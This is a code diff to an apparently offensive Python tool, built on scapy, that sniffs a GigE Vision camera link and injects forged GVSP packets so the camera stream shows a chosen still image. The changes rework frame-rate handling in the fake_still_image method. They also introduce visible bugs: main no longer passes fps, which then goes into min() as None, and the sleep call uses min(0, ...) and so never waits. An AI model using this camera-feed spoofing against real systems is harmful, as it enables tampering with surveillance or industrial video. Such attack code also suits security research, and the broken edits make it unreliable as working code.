@@ -1,7 +1,7 @@
 import cv2
 import matplotlib.pyplot as plt
 import numpy as np
-from typing import List
+from typing import List, Optional
 from scapy.packet import Packet, bind_layers
 from scapy.fields import *
 from scapy.layers.inet import UDP, IP, Ether
@@ -468,8 +468,14 @@ class GigELink:
         )
         return injected_id
 
-    def fake_still_image(self, img_path, duration, frame_rate):
-        # TODO: read register to get frames rate
+    def fake_still_image(
+        self,
+        img_path,
+        duration,
+        injection_effective_frame_rate,
+        fps: Optional[float] = None,
+    ):
+        # TODO: read register to get fps
         timeout = 1  # seconds
         print("Sniffing for blockID")
         sniff(
@@ -493,7 +499,7 @@ class GigELink:
             timeout=timeout,
         )
         print("Faking")
-        num_frames = round(duration * frame_rate)
+        num_frames = round(duration * min(injection_effective_frame_rate, fps))
         print(f"Number of fake frames = {num_frames}")
         print(f"Last GVSP BlockID = {self.last_block_id}")
         gvsp_fake_packets = self.img_to_gvsp(img_path, block_id=default_block_id)
@@ -505,8 +511,9 @@ class GigELink:
             itertation_started = time.time()
             sendp(gvsp_fake_packets, iface=self.interface, verbose=False)
             iteration_ended = time.time()
-            iterations_time.append(iteration_ended - itertation_started)
-
+            iteration_duration = iteration_ended - itertation_started
+            iterations_time.append(iteration_duration)
+            time.sleep(min(0, 1 / fps - iteration_duration))
             self.last_block_id = self.last_block_id + 1
 
         aliasing_finished = time.time()
@@ -544,7 +551,11 @@ def main():
     args = parse_args()
     link = GigELink(interface)
     link.sniff_link_parameters()
-    link.fake_still_image(args.path, duration=args.duration, frame_rate=args.frame_rate)
+    link.fake_still_image(
+        args.path,
+        duration=args.duration,
+        injection_effective_frame_rate=args.frame_rate,
+    )
 
 
 if __name__ == "__main__":
